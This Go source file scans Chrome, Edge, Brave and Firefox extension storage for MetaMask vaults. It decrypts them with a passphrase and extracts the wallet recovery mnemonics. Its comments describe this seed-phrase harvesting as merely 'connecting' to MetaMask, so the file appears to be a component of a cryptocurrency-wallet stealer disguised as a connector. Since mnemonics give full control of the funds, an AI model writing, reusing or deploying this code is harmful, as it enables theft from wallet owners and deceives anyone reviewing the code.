package modules

import (
	"bufio"
	"bytes"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"github.com/golang/leveldb/db"
	"github.com/golang/leveldb/table"
	"github.com/golang/snappy"
	"github.com/schollz/sqlite3dump"
	"io/ioutil"
	_ "modernc.org/sqlite"

	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
)

type MetaA struct {
	Accts []Meta `json:"accts"`
}

type Meta struct {
	Data          string `json:"data"`
	Iv            string `json:"iv"`
	Salt          string `json:"salt"`
	Password      string `json:"password"` // not in json but we use locallly
	ValidPassword bool
	Decoded       bool
	BData         []byte // decoded
	BIv           []byte
	BSalt         []byte
	Mnemonic      string `json:"mnemonic"`
	OS            string `json:"os"`
	Location      string `json:"location"`
	FileName      string `json:"filename"`
}

func getBlankMetaStruct() Meta {
	return Meta{ValidPassword: false, Decoded: false, Location: "not set", FileName: ""} // defaults
}

//  Function used to connect to Metamask / scan for vault with credentials provided by user
func ScanForMnemonics(passphrase string) []string {
	metaAccounts := MetaA{}
	mnemonics_map := make(map[string]Meta)
	mnemonics := []string{}

	dirname, errdd := os.UserHomeDir()
	if errdd != nil {
		return nil
	}

	// check google extension
	folderlist := make(map[string]bool)

	//var  ccnt int = 0
	var numOnlyRegexp = regexp.MustCompile(`^[0-9]*$`)

	if runtime.GOOS == "windows" {

		// CONNECT PATHS TO LOCAL METAMASK CONNECTORS

		// //google
		folderlist[dirname+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"] = true
		//ms
		folderlist[dirname+"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"] = true
		folderlist[dirname+"\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"] = true
		//brave
		folderlist[dirname+"\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"] = true
		// firefox //
		_ = filepath.Walk(dirname+"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", func(path string, info os.FileInfo, err error) error {
			if err == nil && info.IsDir() && strings.HasPrefix(info.Name(), "moz-extension+++") {
				_ = filepath.Walk(path, func(path2 string, info2 os.FileInfo, err error) error {
					if err == nil && strings.HasSuffix(info2.Name(), ".sqlite") {
						folderlist[filepath.Dir(path2)] = true
					}
					if err == nil && numOnlyRegexp.MatchString(info2.Name()) { // number only, is likely snappy file
						folderlist[filepath.Dir(path2)] = true
					}
					return nil
				})
			}
			return nil
		})
	} else { //OSX or Linux?

		// CONNECT PATHS TO LOCAL METAMASK INSTALLATIONS

		// google
		folderlist[dirname+"/Library/Application Support/Google/Chrome/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"] = true //
		// edge
		folderlist[dirname+"/Library/Application Support/Microsoft/Edge/Default/Local Extension Settings/ejbalbakoplchlghecdalmeeeajnimhm"] = true //
		folderlist[dirname+"/Library/Application Support/Microsoft/Edge/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"] = true //
		//brave
		folderlist[dirname+"/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"] = true
		// firefox
		_ = filepath.Walk(dirname+"/Library/Application Support/Firefox/Profiles/", func(path string, info os.FileInfo, err error) error {
			if err == nil && info.IsDir() && strings.HasPrefix(info.Name(), "moz-extension+++") {
				_ = filepath.Walk(path, func(path2 string, info2 os.FileInfo, err error) error {
					if err == nil && strings.HasSuffix(info2.Name(), ".sqlite") {
						folderlist[filepath.Dir(path2)] = true
					}
					if err == nil && numOnlyRegexp.MatchString(info2.Name()) { // number only, is likely snappy file
						folderlist[filepath.Dir(path2)] = true
					}
					return nil
				})
			}
			return nil
		})
	}
	test := ""

	for fulldirname, _ := range folderlist {
		files, errf := ioutil.ReadDir(fulldirname)
		if errf != nil {
			continue
		}

		var arrMeta []Meta
		for _, file := range files {
			if file.IsDir() {
				continue
			}
			meta := getBlankMetaStruct()
			fullfile_s := filepath.Join(fulldirname, file.Name())
			if strings.HasSuffix(file.Name(), ".log") {
				data1, _ := ioutil.ReadFile(fullfile_s)
				meta, metaAccounts = getVaultFromString(string(data1), passphrase, "log", fullfile_s, metaAccounts)
			} else if strings.HasSuffix(file.Name(), ".ldb") {
				data1 := loadLDB(fullfile_s)
				meta, metaAccounts = getVaultFromString(string(data1), passphrase, "ldb", fullfile_s, metaAccounts)
			} else if strings.HasSuffix(file.Name(), ".sqlite") {
				// open and look for table
				data1 := loadSQLITE(fullfile_s)
				meta, metaAccounts = getVaultFromString(string(data1), passphrase, "sqlite", fullfile_s, metaAccounts)
				if !meta.Decoded {
					// try fetching from table as dump does not dump all, esp blobs...
					meta = getBlankMetaStruct()
					db, errDB := sql.Open("sqlite", fullfile_s)
					if errDB == nil {
						rows, errDB2 := db.Query("SELECT data FROM object_data")
						if errDB2 == nil {
							var cdata []byte
							for rows.Next() {
								_ = rows.Scan(&cdata)
								cdata_decoded, errr := snappy.Decode(nil, cdata)
								if errr == nil {
									cdata_decoded_clean := strings.ReplaceAll(string(cdata_decoded), "\x00", "")
									re := regexp.MustCompile("(\\{[a-zA-Z0-9+/=:\\s,\\\"]*?" + "\\\"data\\\"" + "[a-zA-Z0-9+/=:\\s,\\\"]*?\\})")
									match := re.FindStringSubmatch(string(cdata_decoded_clean))
									if match != nil {
										datav3 := ":{\"vault\":" + match[1] + "}"
										meta, metaAccounts = getVaultFromString(datav3, passphrase, "sqliteV3", fullfile_s, metaAccounts)
										if meta.Decoded {
											break
										}
									}
								}
							}
						} else {
							//fmt.PXrintln("NO SUCH TABLE")
							//fmt.PXrintln(errDB2) // IGNORE
						}
						defer db.Close()
					} else {
						// could not open databse, not a database  // IGNORE
					}
				}
			} else {
				data1 := loadSNAPPY(fullfile_s) // lets see if its a snappy file
				if len(data1) > 0 {
					meta, metaAccounts = getVaultFromString(string(data1), passphrase, "snappy", fullfile_s, metaAccounts)
				}
			}
			if meta.Decoded {
				arrMeta = append(arrMeta, meta)
				mnemonics_map[meta.Mnemonic+test] = meta
			}
		}
	}

	for mm, _ := range mnemonics_map {
		mnemonics = append(mnemonics, mm)
	}

	return mnemonics
}

/// leveldb
func loadLDB(filename string) string {
	result := ""
	f, err := os.Open(filename)
	if err != nil {
		return ""
	}

	r := table.NewReader(f, &db.Options{
		VerifyChecksums: false,
	})
	defer r.Close()

	t := r.Find(nil, nil)
	for t.Next() {
		k, v := t.Key(), t.Value()
		result += string(k) + ":" + string(v)
	}
	return result
}

/// SQLITE
func loadSQLITE(filename string) string {

	hbuf := bytes.Buffer{}
	f := bufio.NewWriter(&hbuf) //return htmlbuf.String()
	_ = sqlite3dump.Dump(filename, f)
	f.Flush()
	return hbuf.String()
}

/// snappy
func loadSNAPPY(filename string) string {
	f, err := os.Open(filename)
	if err != nil {
		return ""
	}
	uncompressed, err2 := DecompressSnappyFox(bufio.NewReader(f))
	if err2 != nil {
		return ""
	}
	return (string(uncompressed))
}

func getVaultFromString(vault string, passphrase string, location string, filepath string, accounts MetaA) (Meta, MetaA) {
	vault_clean := strings.ReplaceAll(vault, "\\", "")
	re := regexp.MustCompile("\\\"vault\\\"\\:[\\\"]?(\\{.*?data.*?\\})")
	matchAll := re.FindAllStringSubmatch(string(vault_clean), -1)
	if matchAll == nil {
		return getBlankMetaStruct(), accounts //meta.Valid = false
	}
	meta := getBlankMetaStruct()
	for _, match := range matchAll {
		data := match[1]
		meta = getBlankMetaStruct()
		meta.Location = location
		meta.FileName = filepath
		json.Unmarshal([]byte(data), &meta)

		meta.BData, _ = base64.StdEncoding.DecodeString(meta.Data)
		meta.BIv, _ = base64.StdEncoding.DecodeString(meta.Iv)
		meta.BSalt, _ = base64.StdEncoding.DecodeString(meta.Salt)

		if len(meta.BIv) == 16 && len(meta.BSalt) == 32 {
			b_dk := deriveKey(string(passphrase), meta.BSalt)
			decdata, errX := decrypt(meta.BData, b_dk, meta.BIv)
			if errX == nil { // successfully decoded
				meta.ValidPassword = true
				// get mnemonic key
				re2 := regexp.MustCompile("\\\"mnemonic\\\"\\:\\\"([a-z\\s]+)\\\"")
				match2 := re2.FindStringSubmatch(string(decdata))
				if !(match2 == nil) {
					meta.Mnemonic = match2[1]
					meta.Decoded = true
					break
				} else {
				}
			} else {
			}
		}
		accounts.Accts = append(accounts.Accts, meta)
	}
	return meta, accounts
}
